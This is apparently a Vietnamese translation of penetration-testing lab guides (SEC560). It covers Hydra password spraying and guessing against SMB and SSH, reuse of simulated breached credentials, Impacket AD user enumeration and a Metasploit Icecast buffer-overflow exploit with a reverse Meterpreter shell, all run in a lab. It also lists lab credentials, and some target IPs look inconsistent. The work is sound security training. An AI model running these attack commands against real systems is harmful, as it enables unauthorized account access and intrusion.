![alt text](IMG/LAB2/LAB2.1/image.png)

```txt
Password Unrar: 4yRu#c@7#zk9*F


SEC560 Slingshot Linux (I01): sec560/sec560
SEC560 Windows 10 (I01): sec560/Sec@560/1234@abcd
PC02: Draco Malfoy/<guessing my password>
<!-- SVC_SQLService2 / ^Cakemaker -->
ParrotSec6.0: root/toor
```

![alt text](IMG/LAB2/LAB2.1/image-3.png)

# Lab 2.1. Password Guessing

## Mục tiêu

- Sử dụng Hydra để thực hiện tấn công đoán mật khẩu nhắm vào SMB trên mục tiêu Windows.

- Sử dụng Hydra để thực hiện tấn công dò mật khẩu nhắm vào hệ thống SMB trên máy chủ Windows.

- Sử dụng Hydra để thực hiện tấn công đoán mật khẩu nhằm vào một dịch vụ SSH.

## Thiết lập phòng thí nghiệm.

Máy ảo được sử dụng:

- Slingshot Linux.

Bạn có thể ping địa chỉ 10.130.10.10 từ máy ảo Slingshot Linux:

Yêu cầu

```bash
ping -c 4 10.130.10.10
```

Kết quả dự kiến

![alt text](IMG/LAB2/LAB2.1/image-1.png)

## Hướng dẫn thực hành từng bước

Bây giờ chúng ta sẽ tiến hành bài thực hành đoán mật khẩu trên hai máy mục tiêu:

- `10.130.10.10`: Một máy chủ web Linux.

- `10.130.10.4`: Bộ điều khiển miền Windows.

Giả sử chúng ta được thông báo rằng tổ chức mục tiêu có chính sách mật khẩu yêu cầu tất cả mật khẩu phải có độ dài từ tám ký tự trở lên và đáp ứng 3 trong 4 tiêu chí sau:

- Con số.

- Chữ hoa.

- chữ thường.

- Ký tự đặc biệt.

Đây là một chính sách rất tiêu chuẩn.

Đó là kịch bản của chúng ta. Hãy cùng nhau tấn công nó.

### 1. Password Spray

Chúng ta hãy thử phương pháp "thử mật khẩu ngẫu nhiên", bằng cách chọn một mật khẩu và nhiều tên người dùng khác nhau. Đây là một kỹ thuật tốt khi bạn có một danh sách lớn các tài khoản người dùng và cần phải cẩn thận với các chính sách đăng nhập có thể khóa tài khoản sau quá nhiều lần đoán sai mật khẩu.

Ngoài ra, trong quá trình kiểm thử xâm nhập, tên người dùng sẽ không được cung cấp cho bạn một cách dễ dàng.

Giả sử chúng ta đã biết định dạng từ giai đoạn trinh sát, và chúng ta đã xác định định dạng tên người dùng là chữ cái đầu tiên của tên theo sau là họ (chúng ta sẽ gọi đây là "flast"). Vì vậy, Walt Disney sẽ có tài khoản đó `wdisney`. Chúng ta chưa biết bất kỳ tài khoản hợp lệ nào vào thời điểm này. Điều chúng ta cần làm là đoán.

Một cá nhân nào đó đã khéo léo trích xuất danh sách tên từ Facebook và sử dụng danh sách đó để tạo ra một danh sách tên ở định dạng "flast".

Chúng tôi đã cung cấp 100 tên người dùng hàng đầu từ danh sách đó `/opt/passwords/facebook-f.last-100.txt` (Danh sách đầy đủ có thể được tìm thấy trên skullsecurity.org ). Hãy cùng xem 20 tên người dùng đầu tiên trong danh sách.

Yêu cầu:

```bash
head -n 20 /opt/passwords/facebook-f.last-100.txt
```

Kết quả dự kiến:

![alt text](IMG/LAB2/LAB2.1/image-2.png)


Như bạn thấy, Smith là một họ rất phổ biến. Chúng ta sẽ sử dụng danh sách này để thử đoán mật khẩu ban đầu, kết hợp với một số mật khẩu yếu (dễ đoán) phổ biến.

Hãy sử dụng danh sách này với mật khẩu thông dụng, định dạng SeasonYear (Mùa năm). Hãy nhớ rằng, Hiboxy là một công ty Bắc Mỹ, vì vậy hãy sử dụng mùa hiện tại (Xuân, Hè, Thu, Đông) và năm hiện tại. Ví dụ, nếu hiện tại là tháng Hai năm 2022, bạn sẽ sử dụng mật khẩu `Winter2022`. Nếu cách đó không hiệu quả, hãy thử mùa tiếp theo (có thể việc xoay vòng 90 ngày yêu cầu thay đổi) cũng như mùa trước đó (người dùng có thể chưa cần xoay vòng).

Hãy xem chúng ta tìm thấy gì nào!

> Ghi chú
>
> Lưu ý: Mật khẩu ở đây được tạo tự động bằng chương trình, vì vậy mật khẩu thực tế sẽ khác nhau tùy thuộc vào thời điểm bạn tham gia lớp học và thời điểm cơ sở hạ tầng được xây dựng. Chúng tôi sẽ sử dụng ký hiệu giữ chỗ SEASONYEAR thay cho mật khẩu thật.

Hãy sử dụng Hydra cho việc phun mật khẩu này (nhớ thay thế `SEASONYEAR` bằng mùa hiện tại ở bán cầu bắc và năm hiện tại).

Chúng tôi sẽ sử dụng các phương án sau:

- `-L /opt/passwords/facebook-f.last-100.txt` Sử dụng danh sách tên người dùng.
- `-p SEASONYEAR` Hãy sử dụng mật khẩu SeasonYear chính xác hiện tại (ví dụ: "Spring2022")
- `-m workgroup:{hiboxy}` Chúng ta đang kết nối đến bộ điều khiển miền và cần chỉ định miền (lưu ý: bạn cần có {}),
- `10.130.10.4` Địa chỉ IP của bộ điều khiển miền (tìm thấy bằng cách quét)
- `smb2` Giao thức

Vui lòng thay thế `SEASONYEAR` trong lệnh sau bằng mùa và năm hiện tại ở bán cầu bắc, ví dụ như `Spring2024` (do mật khẩu sẽ được setup khi mà người học mua nên cần phải chỉnh thành năm đúng người dùng mua).

```bash
hydra -L /opt/passwords/facebook-f.last-100.txt -p Spring2024 -m workgroup:{hiboxy} 10.130.10.10 smb2
```

Kết quả dự kiến:

![alt text](IMG/LAB2/LAB2.1/image-5.png)

Đã tìm thấy mật khẩu cho `alee`.

Nhân tiện, bạn có thể tìm thấy người dùng này bằng cách xem trang giới thiệu của trang web chính!

Trong thực tế, chúng ta sẽ đợi cho đến khi khoảng thời gian quan sát dài nhất kết thúc trước khi thử đoán mật khẩu khác. Nếu chúng ta làm quá nhanh, chúng ta có nguy cơ khóa tài khoản người dùng và gây ra từ chối dịch vụ! Tuy nhiên, đây là môi trường thử nghiệm, và chúng ta đã tắt cài đặt này để quá trình diễn ra nhanh hơn.

Hãy thử thêm một vài lựa chọn khác nữa:

- Mùa giải tới: 

    ```bash
    hydra -L /opt/passwords/facebook-f.last-100.txt -p Summer2024 -m workgroup:{hiboxy} 10.130.10.10 smb2
    ````

    ![alt text](IMG/LAB2/LAB2.1/image-6.png)

- Mùa giải trước:

    ```bash
    hydra -L /opt/passwords/facebook-f.last-100.txt -p  Winter2023 -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    ![alt text](IMG/LAB2/LAB2.1/image-7.png)

- Mùa này được thêm `!` vào cuối:

    ```bash
    hydra -L /opt/passwords/facebook-f.last-100.txt -p  Spring2024! -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    ![alt text](IMG/LAB2/LAB2.1/image-8.png)

- Mùa tiếp theo với chữ `!` vào cuối:

    ```bash
    hydra -L /opt/passwords/facebook-f.last-100.txt -p  Summer2024! -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    ![alt text](IMG/LAB2/LAB2.1/image-9.png)

- Mùa trước được thêm `!` vào cuối:

    ```bash
    hydra -L /opt/passwords/facebook-f.last-100.txt -p  Winter2023! -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    ![alt text](IMG/LAB2/LAB2.1/image-11.png)

Bạn đáng lẽ phải tìm thấy những người dùng và mật khẩu này.

|Tên người dùng|Định dạng mật khẩu|
|--|--|
|`alee`|`Spring2024`|
|`Janerson`|`Summer2024`|
|`ssmith`|`Summer2024!`|
|`jlopez`|`Winter2023!`|

### 2. The dictionary

Danh sách mật khẩu dùng để đoán sẽ ngắn hơn nhiều so với danh sách mật khẩu dùng để tấn công (chúng ta sẽ thảo luận về tấn công sau trong khóa học này). Việc đoán mật khẩu yêu cầu chúng ta tương tác với một dịch vụ từ xa, điều này sẽ chậm hơn. Ngoài ra, chúng ta không muốn thao tác quá nhanh để tránh gây ra tấn công từ chối dịch vụ. Thêm vào đó, các cuộc tấn công mật khẩu trực tuyến có thể dẫn đến việc bị khóa tài khoản, vì vậy chúng ta cần phải cẩn thận. Chúng tôi đã vô hiệu hóa tính năng khóa tài khoản để bạn (và các sinh viên khác) không gây ra sự cố với phòng thí nghiệm.

Để đơn giản hóa mọi việc, chúng ta sẽ sử dụng một danh sách mật khẩu rất đơn giản bao gồm mùa và năm, cũng như Mật khẩu 1. Hãy cùng xem nội dung của tệp mà chúng ta sẽ sử dụng cho lần đoán ban đầu.

```bash
cat /opt/passwords/simple.txt
```

![alt text](IMG/LAB2/LAB2.1/image-12.png)

Hãy đếm số dòng bằng cách sử dụng `wc -l`.

```bash
wc -l /opt/passwords/simple.txt
```

![alt text](IMG/LAB2/LAB2.1/image-13.png)

Chúng ta đã có sẵn danh sách mật khẩu đơn giản rồi. Bắt đầu đoán thôi!

### 3. Password Guessing (SSH)

Với danh sách mật khẩu tùy chỉnh trong tay, giờ đây chúng ta có thể cấu hình Hydra cho cuộc tấn công đoán mật khẩu đầu tiên. Chúng ta biết một trong những tên quản trị viên Linux là Bruce Green, vì vậy chúng ta sẽ sử dụng tên này bgreenđể đoán mật khẩu.

Chạy Hydra với các thiết lập sau:


- Tên người dùng `bgreen`.

- Hãy sử dụng danh sách mật khẩu mà chúng ta vừa tạo.

- Mục tiêu đơn lẻ `10.130.10.10`.

- Giao thức là SSH.

```bash
hydra -l bgreen -P /opt/passwords/simple.txt 10.130.10.10 ssh
```

![alt text](IMG/LAB2/LAB2.1/image-14.png)

Hãy chú ý đến dòng sau trong kết quả đầu ra.

```bash
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
```

Hydra cảnh báo chúng ta rằng SSH có thể giới hạn tốc độ và đề xuất sử dụng 4 luồng thay vì 16 luồng mặc định. Hydra vẫn sử dụng giá trị mặc định để quét.

### 4. Verifying Access

Giờ chúng ta đã có tài khoản này, hãy sử dụng Hydra để xem liệu chúng ta có thể sử dụng thông tin đăng nhập này trên bất kỳ hệ thống Windows nào không.

Trước tiên, hãy lấy danh sách các hệ thống đang lắng nghe trên cổng 445 (SMB). Chúng ta sẽ chạy Nmap chỉ nhắm mục tiêu vào cổng 445 và lưu kết quả vào /tmp.

```bash
nmap -n -Pn -p 445 --open -oA /tmp/smb 10.130.10.0/24
```

- `nmap` : công cụ quét mạng/port.

- `-n` : không DNS resolve (không đổi IP → tên máy). Quét nhanh hơn, ít “ồn” hơn.

- `-Pn` : coi như host luôn online, không ping/không discovery trước → Hữu ích khi ICMP bị chặn. Nhược: sẽ quét cả host "chết" nên có thể chậm hơn.

- `-p 445` : chỉ quét cổng 445 (SMB).

- `--open` : chỉ hiển thị host có port mở (open) thôi.

- `-oA /tmp/smb` : xuất kết quả theo 3 định dạng cùng lúc với prefix /tmp/smb:
    
    `/tmp/smb.nmap` (text dễ đọc).

    `/tmp/smb.gnmap` (grep-able).
    
    `/tmp/smb.xml` (xml cho tool khác).

- `10.130.10.0/24` : dải IP từ 10.130.10.1 đến 10.130.10.254 (thường vậy; .0 là network, .255 là broadcast).

Kết quả:

![alt text](IMG/LAB2/LAB2.1/image-15.png)

Sau đó, chúng ta sẽ sử dụng `grep` và `cut` để lấy danh sách các hệ thống đang lắng nghe trên cổng 445 và lưu nó vào bằng `/tmp/smbservers.txt` cách sử dụng `tee`.

```bash
grep 445/open /tmp/smb.gnmap | cut -d' ' -f 2 | tee /tmp/smbservers.txt
```

![alt text](IMG/LAB2/LAB2.1/image-16.png)

Nếu thực hành online thì kết quả sẽ như sau:

```bash
sec560@slingshot:~$ grep 445/open /tmp/smb.gnmap | cut -d' ' -f 2 | tee /tmp/smbservers.txt
10.130.10.4
10.130.10.5
10.130.10.6
10.130.10.21
10.130.10.25
10.130.10.33
10.130.10.44
10.130.10.45
```

Trong lệnh trên, chúng ta thực sự không cần sử dụng grep 445/open, nhưng điều này được khuyến nghị nếu chúng ta đã quét với nhiều hơn một cổng (như các lần quét trong Bài thực hành 1.4).

Hãy sử dụng Hydra để kiểm tra xem thông tin đăng nhập này có hợp lệ trên hệ thống Windows hay không.

```bash
hydra -m workgroup:{hiboxy} -l bgreen -p Password1 -M /tmp/smbservers.txt smb2
```

![alt text](IMG/LAB2/LAB2.1/image-17.png)

Nếu thực hành online kết quả sẽ như sau:

```bash
sec560@slingshot:~$ hydra -m workgroup:{hiboxy} -l bgreen -p Password1 -M /tmp/smbservers.txt smb2
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-22 22:22:22
[DATA] max 1 task per 8 servers, overall 8 tasks, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking smb2://(8 targets):445/workgroup:{hiboxy}
[445][smb2] host: 10.130.10.25   login: bgreen   password: Password1
[445][smb2] host: 10.130.10.4   login: bgreen   password: Password1
[445][smb2] host: 10.130.10.5   login: bgreen   password: Password1
[445][smb2] host: 10.130.10.6   login: bgreen   password: Password1
[445][smb2] host: 10.130.10.21   login: bgreen   password: Password1
[445][smb2] host: 10.130.10.33   login: bgreen   password: Password1
[445][smb2] host: 10.130.10.44   login: bgreen   password: Password1
[445][smb2] host: 10.130.10.45   login: bgreen   password: Password1
8 of 8 targets successfully completed, 8 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-22 22:22:22
```

Tại sao có vẻ như tài khoản này có quyền truy cập vào tất cả các hệ thống Windows này? Hãy nhớ rằng, tất cả những gì chúng ta đang làm là xác định xem thông tin đăng nhập tài khoản miền có hợp lệ hay không. Việc kiểm tra này KHÔNG kiểm tra xem người dùng có quyền quản trị đối với các máy tính từ xa này hay không. Để thực hiện loại kiểm tra này, chúng ta cần sử dụng một công cụ, chẳng hạn như Find-LocalAdminAccesstừ PowerSploit .

### 5. Breached Credentials (thông tin đăng nhập bị rò rỉ)

Như đã thảo luận trước đó trong khóa học, chúng ta thường tìm kiếm thông tin đăng nhập bị đánh cắp trong giai đoạn trinh sát. Chúng tôi đã cung cấp kết quả từ một cuộc tìm kiếm (mô phỏng) các thông tin đăng nhập đó. Hãy cùng xem danh sách tại địa chỉ này `/opt/passwords/hiboxy-breach.txt`.

```bash
cat /opt/passwords/hiboxy-breach.txt
```

![alt text](IMG/LAB2/LAB2.1/image-18.png)

Tên người dùng và mật khẩu được phân tách bằng dấu hai chấm (:) để chúng ta có thể sử dụng chúng với Hydra. Hãy thử sử dụng các mật khẩu này với Hydra để xem mật khẩu nào hợp lệ.

Sử dụng `-C` tùy chọn này với Hydra để kiểm tra thông tin đăng nhập đã chỉ định. Nó sẽ chỉ thử các tổ hợp đã được chỉ định.

```bash
hydra -C /opt/passwords/hiboxy-breach.txt 10.130.10.10 -m workgroup:{hiboxy} smb2
```

- `hydra`: Công cụ tự động thử đăng nhập nhiều lần với nhiều tài khoản/mật khẩu cho các dịch vụ mạng (SSH, FTP, SMB…).

- `-C /opt/passwords/hiboxy-breach.txt`: Dùng combo list (danh sách username:password) trong file hiboxy-breach.txt. Tức mỗi dòng thường có dạng: user:pass.

- `10.130.10.4`: Máy mục tiêu (IP) để thử đăng nhập.

- `-m workgroup:{hiboxy}`: -m là tham số bổ sung cho module. Với SMB, nó đang đặt workgroup/domain là hiboxy (Hydra sẽ gửi kèm thông tin workgroup khi xác thực SMB).

- `smb2`: Chỉ định dịch vụ/module SMB2 (SMB phiên bản 2), thường chạy trên TCP/445.

Kết quả: 

![alt text](IMG/LAB2/LAB2.1/image-19.png)

Chúng tôi đã phát hiện ra hai trong số các thông tin đăng nhập bị đánh cắp vẫn hoạt động trên tên miền của chúng tôi!

### 6. Password Spraying all domain users

Giờ đây, khi đã có ít nhất một thông tin đăng nhập miền hợp lệ, chúng ta có thể trích xuất danh sách đầy đủ người dùng. Chúng ta sẽ sử dụng `GetADusers.py` từ Impacket. Chúng ta sẽ thảo luận thêm về Impacket trong mục 560.4. Chúng ta cần cung cấp thông tin đăng nhập ở định dạng người dùng:mật khẩu. Chúng ta cũng cần chỉ định địa chỉ IP của bộ điều khiển miền (`-dc-ip`) và yêu cầu công cụ lấy danh sách tất cả người dùng bằng `-all`. Chúng ta sẽ hiển thị kết quả trên màn hình và lưu kết quả bằng tee.

Trước hết cập nhật gói phần mềm:

```bash
python3 -m pip install --upgrade pip
python3 -m pip install charset_normalizer
python3 -m pip install --upgrade "cffi>1.12"
```

```bash
GetADUsers.py hiboxy.com/bgreen:Password1 -dc-ip 10.130.10.10 -all | tee /tmp/adusers.txt
```

![alt text](IMG/LAB2/LAB2.1/image-20.png)

Hãy trích xuất danh sách người dùng. Nhìn vào kết quả ở trên, chúng ta cần bỏ qua 6 dòng đầu tiên rồi lấy mục đầu tiên trên mỗi dòng. Chúng ta sẽ sử dụng `tail -n +6` để bỏ qua 6 dòng đầu tiên, sau đó `cut` để lấy cột đầu tiên.

```bash
tail -n +6 /tmp/adusers.txt | cut -d ' ' -f 1 | tee /tmp/domainusers.txt
```

![alt text](IMG/LAB2/LAB2.1/image-21.png)

Danh sách người dùng:

Giờ chúng ta đã có danh sách người dùng tên miền, hãy thử tấn công bằng phương pháp `spraying password` (phun). Hãy bắt đầu với `Password1`.

```bash
hydra -L /tmp/domainusers.txt -p Password1 -m workgroup:{hiboxy} 10.130.10.10 smb2
```

![alt text](IMG/LAB2/LAB2.1/image-22.png)

Trong thực tế, bạn sẽ đợi cho đến khi cửa sổ quan sát khóa tài khoản hết hạn, rồi thử lại. Vì đây là phòng thí nghiệm đã tắt chức năng khóa tài khoản, hãy thử lại với một vài mật khẩu khác:

- `Password1!:`

    ```bash
    hydra -L /tmp/domainusers.txt -p Password1! -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    ![alt text](IMG/LAB2/LAB2.1/image-23.png)

- `Mùa hiện tại + Năm:`

    ```bash
    hydra -L /tmp/domainusers.txt -p Spring2024 -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    ![alt text](IMG/LAB2/LAB2.1/image-24.png)

- `Mùa tiếp theo + năm:`

    ```bash
    hydra -L /tmp/domainusers.txt -p Summer2024 -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    ![alt text](IMG/LAB2/LAB2.1/image-25.png)

- `Mùa trước + Năm`:

    ```bash
    hydra -L /tmp/domainusers.txt -p Winter2024 -m workgroup:{hiboxy} 10.130.10.10 smb2
    hydra -L /tmp/domainusers.txt -p Winter2023 -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    Không có kết quả.

- `Mùa hiện tại + năm + !:`

    ```bash
    hydra -L /tmp/domainusers.txt -p Spring2024! -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    Không có kết quả.

- `Mùa tiếp theo Năm + !:`

    ```bash
    hydra -L /tmp/domainusers.txt -p Summer2024! -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    ![alt text](IMG/LAB2/LAB2.1/image-26.png)

- `Mùa trước Năm + !:`

    ```bash
    hydra -L /tmp/domainusers.txt -p Winter2023! -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    ![alt text](IMG/LAB2/LAB2.1/image-27.png)

Các mật khẩu bạn cần tìm được liệt kê bên dưới. Nhấp vào để mở rộng và xem tất cả các mật khẩu.



```txt
Administrator
Guest
krbtgt
alee:Spring2024
bgreen:Password1
janderson:Summer2024
ssmith:Summer2024!
jlopez: Winter2023!
SVC_SQLService2
jjohnson
mbell
jcooper:Password1
mhernandez:Password1!
antivirus
SVC_SQLService

SVC_SQLService2:^Cakemaker
```

## Phần kết luận

Trong thí nghiệm này, chúng tôi đã thực hiện một cuộc tấn công dò mật khẩu bằng cách sử dụng danh sách người dùng và một mật khẩu duy nhất. Chúng tôi cũng đã thực hiện một cuộc tấn công đoán mật khẩu vào SSH với một danh sách mật khẩu. Cuối cùng, chúng tôi đã kiểm tra các mật khẩu bị đánh cắp đối với tên miền để tìm thêm thông tin đăng nhập hợp lệ.

Khi kết hợp các kỹ thuật này, chúng vô cùng hữu ích đối với một chuyên gia kiểm thử xâm nhập vì chúng có thể cung cấp mật khẩu để truy cập vào môi trường mục tiêu. Quyền truy cập đó có thể là điểm xâm nhập ban đầu vào hệ thống mục tiêu, mà chuyên gia kiểm thử xâm nhập sau đó có thể sử dụng để đánh cắp thông tin và chuyển hướng tấn công.

# Lab 2.2. Metasploit và Meterpreter

## Mục tiêu

Trong bài thực hành này, chúng ta sẽ phân tích Meterpreter, sử dụng Metasploit để triển khai payload linh hoạt này đến một dịch vụ dễ bị tổn thương mà bạn tạm thời cài đặt trên máy tính Windows của mình. Cụ thể, chúng ta sẽ khai thác dịch vụ **Icecast (phiên bản 2.0.0)**, một máy chủ truyền phát đa phương tiện trên internet có lỗ hổng tràn bộ đệm. Payload Metasploit của chúng ta sẽ bao gồm giai đoạn `Meterpreter`, được tải thông qua `stager reverse_tcp`, thiết lập kết nối từ máy bị khai thác trở lại máy tấn công.

## Các bước thực hành trong phòng thí nghiệm

Bạn sẽ thực hiện bài thực hành này hoàn toàn trên hệ thống của riêng mình, với dịch vụ Icecast dễ bị tổn thương trên máy tính Windows của bạn sẽ bị khai thác bởi máy ảo Linux. Trên slide, chúng tôi minh họa các bước từ 1 đến 4 của bài thực hành này. Lưu ý rằng trong suốt toàn bộ bài thực hành, mỗi số bước này vẫn sẽ được áp dụng.

**Bước 1:** Cấu hình Metasploit để khai thác lỗ hổng Icecast.

**Bước 2:** Khai thác dịch vụ mục tiêu, gửi stager reverse_tcp làm payload với stage Meterpreter.

**Bước 3:** Sử dụng Meterpreter chạy bên trong không gian bộ nhớ của Icecast, chuyển hướng kết nối TCP ngược trở lại kẻ tấn công.

**Bước 4:** Tương tác với Meterpreter đang chạy bên trong tiến trình Icecast của máy bị xâm nhập.

![alt text](IMG/LAB2/LAB2.2/image.png)

## Thiết lập phòng thí nghiệm

Các máy ảo được sử dụng:

- Slingshot Linux.

- Windows 10.

Trong bài thực hành này, bạn sẽ tấn công máy tính Windows của mình, khiến nó chạy chương trình Meterpreter. Bạn sẽ vận hành một máy chủ dễ bị tấn công. Đối với bài thực hành này, chúng tôi khuyên bạn nên ngắt kết nối khỏi VPN.

Sau đó, trong Linux, hãy chạy lệnh sau:

```bash
ping IP_address
```

## Hướng dẫn thực hành từng bước

### 1. Metasploit trên Linux

Chúng ta sẽ chuyển sang máy ảo Linux. Bước 1 bao gồm chạy Metasploit và cấu hình nó để khai thác dịch vụ Icecast. Khởi chạy Metasploit bằng lệnh sau:

```bash
msfconsole
```

Lưu ý rằng dấu nhắc lệnh của bạn hiện là dấu nhắc bảng điều khiển Metasploit Framework (`msf6 >`). Tại dấu nhắc msf, hãy nhập các lệnh vào Metasploit một cách tương tác. Yêu cầu nó hiển thị tất cả các mô-đun khai thác mà nó có sẵn.

```bash
show exploits
```

![alt text](IMG/LAB2/LAB2.2/image-1.png)

Bạn có thể thấy có hơn 2.200 lỗ hổng bảo mật trong Metasploit!

Chúng ta sẽ khai thác lỗ hổng Icecast trên Windows. Hãy tìm kiếm lỗ hổng đó.

![alt text](IMG/LAB2/LAB2.2/image-2.png)

Bạn sẽ thấy một lỗ hổng bảo mật dành cho Windows có tên là icecast_header, với xếp hạng "great".

Bây giờ chúng ta sẽ chọn lỗ hổng. Chúng ta sẽ sử dụng lỗ hổng tràn bộ đệm tiêu đề Icecast, lỗ hổng này phù hợp với phiên bản Icecast mà chúng ta đã cài đặt:

```bash
use exploit/windows/http/icecast_header
```

![alt text](IMG/LAB2/LAB2.2/image-3.png)

Lưu ý rằng lời nhắc của chúng ta đã thay đổi và hiện bao gồm tên của lỗ hổng mà chúng ta đã chọn. Ngoài ra, bạn sẽ thấy rằng một payload đã được chọn sẵn cho chúng ta. Hãy sử dụng một payload Meterpreter khác thực hiện kết nối HTTP ngược (thay vì TCP thông thường) trở lại kẻ tấn công sau khi nó đang chạy bên trong tiến trình dễ bị tổn thương.

Đặt target thành `windows/meterpreter/reverse_http`.

```bash
set PAYLOAD windows/meterpreter/reverse_http
```

![alt text](IMG/LAB2/LAB2.2/image-4.png)

Tiếp theo, chúng ta hãy xem xét các tùy chọn liên quan đến lỗ hổng này:

![alt text](IMG/LAB2/LAB2.2/image-5.png)

Tùy chọn đầu tiên chúng ta sẽ thiết lập là RHOSTS. Đây sẽ là địa chỉ IP mà chúng ta muốn Metasploit tấn công. Chúng ta nên nhập địa chỉ IP của máy tính Windows đang chạy dịch vụ Icecast dễ bị tổn thương. Sử dụng `Ethernet0` địa chỉ IP, không phải `tun0` địa chỉ IP. Địa chỉ bạn đang tìm kiếm KHÔNG bắt đầu bằng `10.254.25X.X`.

Hãy đặt `RHOSTS` tùy chọn thành địa chỉ IP của giao diện Ethernet0 trên hệ điều hành Windows của bạn.

```bash
msf6 exploit(windows/http/icecast_header) > back
msf6 > set RHOSTS 10.130.10.25
RHOSTS => 10.130.10.25
```

![alt text](IMG/LAB2/LAB2.2/image-6.png)

Đặt giá trị `LHOST` thành địa chỉ IP của `eth0` giao diện hệ thống Linux của bạn.

```bash
msf6 > set LHOST eth0
```

Metasploit đã được cấu hình xong. Hãy cùng xem lại cấu hình Metasploit của chúng ta bằng lệnh `show options`.

![alt text](IMG/LAB2/LAB2.2/image-7.png)

Chúng tôi gần như đã sẵn sàng cho cuộc tấn công, nhưng trước tiên chúng tôi cần phải hoàn tất một số công việc chuẩn bị.

Bây giờ chúng ta cần khởi động máy chủ Icecast trên máy tính Windows của mình.

Nhấp chuột phải vào biểu tượng Icecast trên màn hình máy tính và chọn "Chạy với quyền quản trị viên" .

![alt text](IMG/LAB2/LAB2.2/image-8.png)

Khi giao diện người dùng (GUI) của Icecast xuất hiện, hãy nhấp vào nút Bắt đầu máy chủ . Trạng thái máy chủ sẽ chuyển sang màu xanh lục và hiển thị "Running".

![alt text](IMG/LAB2/LAB2.2/image-9.png)

![alt text](IMG/LAB2/LAB2.2/image-10.png)

Để đảm bảo Windows có thể kết nối đến máy Linux của chúng ta với shell Meterpreter đảo ngược mà không bị hạn chế, chúng ta cũng cần đảm bảo Windows có thể ping Linux. Trên máy Windows của bạn, tại cmd.exe , hãy chạy lệnh sau:

```bash
ping 10.130.10.128
```

![alt text](IMG/LAB2/LAB2.2/image-11.png)

Nếu lệnh ping thành công, chúng ta có thể tiếp tục. Nếu không, hãy kiểm tra lại cài đặt mạng của bạn.

### 2. Phát động cuộc tấn công

Hãy bắt đầu cuộc tấn công! Trên máy Linux của bạn, tại dấu nhắc msf, gõ `run` và nhấn Enter:

Nếu cuộc tấn công thành công, bạn sẽ thấy một thông báo trên Linux có nội dung "Meterpreter session 1 opened".

![alt text](IMG/LAB2/LAB2.2/image-13.png)

### 3. Sessions

Thông báo nhắc nhở `meterpreter >` cho bạn biết bạn đang ở trong Meterpreter. Nếu bạn muốn thực hiện các thao tác khác trong Metasploit, trước tiên bạn cần đưa phiên làm việc về chế độ nền bằng cách gõ `background` hoặc nhấn phím `CTRL+z`.

Nhập lệnh này `background` để quay lại giao diện điều khiển Metasploit.

```bash
background
# meterpreter > background
# [*] Backgrounding session 1...
# msf6 exploit(windows/http/icecast_header) > 
```

Tại `msf6` dấu nhắc lệnh, chúng ta hiện đang tương tác với Metasploit, chứ không phải với Meterpreter trên máy chủ bị xâm nhập. Hãy cùng xem xét `sessions`...

![alt text](IMG/LAB2/LAB2.2/image-14.png)

Trong trường hợp này, bạn có thể thấy phiên làm việc là `1`. Phiên của bạn có thể khác.

Việc đánh số phiên rất tiện lợi, nhưng chúng ta có thể sẽ có nhiều shell và việc nhớ các số này sẽ khó khăn. Chúng ta có thể đổi tên phiên thành một cái tên dễ nhớ hơn. Để đổi tên phiên, chúng ta cần sử dụng lệnh `use` `-n newname` và số phiên hiện tại `-i ID`.

```bash
sessions -n inecast_win10 -i 1
sessions
```

![alt text](IMG/LAB2/LAB2.2/image-15.png)

Bây giờ chúng ta hãy cùng tương tác trong phiên.


```bash
sessions -i 1
```

### 4. Meterpreter

Khi chuyển sang Bước 4 để tương tác với phiên Meterpreter, hãy cùng xem lại kiến ​​trúc của những gì chúng ta đang quan sát. Bạn đang xem phiên Meterpreter trên máy Linux chạy Metasploit. Phiên đó thực chất đang điều khiển máy Windows của bạn, với Meterpreter chạy bên trong tiến trình Icecast.

Sau khi chạy Meterpreter, chúng ta hãy cùng khám phá hệ thống một chút. Chạy lệnh sau:

```bash
sysinfo
```

![alt text](IMG/LAB2/LAB2.2/image-16.png)

Điều này cho chúng ta biết loại hệ điều hành của máy tính bị xâm nhập.

Bây giờ, hãy xác định tên người dùng của chúng ta trên ô nạn nhân:

```bash
getuid
```

![alt text](IMG/LAB2/LAB2.2/image-17.png)

Chúng ta cần sử dụng cùng tên người dùng mà bạn đã dùng để khởi chạy máy chủ Icecast vì chúng ta đang chạy từ bên trong không gian bộ nhớ của nó.

```bash
ps
```

![alt text](IMG/LAB2/LAB2.2/image-18.png)

![alt text](IMG/LAB2/LAB2.2/image-19.png)

Hãy cùng xem xét các tùy chọn mà chúng ta có với pslệnh này bằng cách xem phần trợ giúp.

```bash
ps -h
```

![alt text](IMG/LAB2/LAB2.2/image-20.png)

Hãy tìm tiến trình Icecast2 của chúng ta bằng cách sử dụng `-S`.

![alt text](IMG/LAB2/LAB2.2/image-21.png)

Hãy tìm kỹ tiến trình có tên [tên tiến trình] `Icecast2.exe`. Ghi lại số ID của tiến trình đó tại đây:

```bash
Process ID for Icecast2.exe : _____________
```

Cuối cùng, hãy cùng xem các lệnh Meterpreter mà chúng ta có sẵn:

```bash
help
```

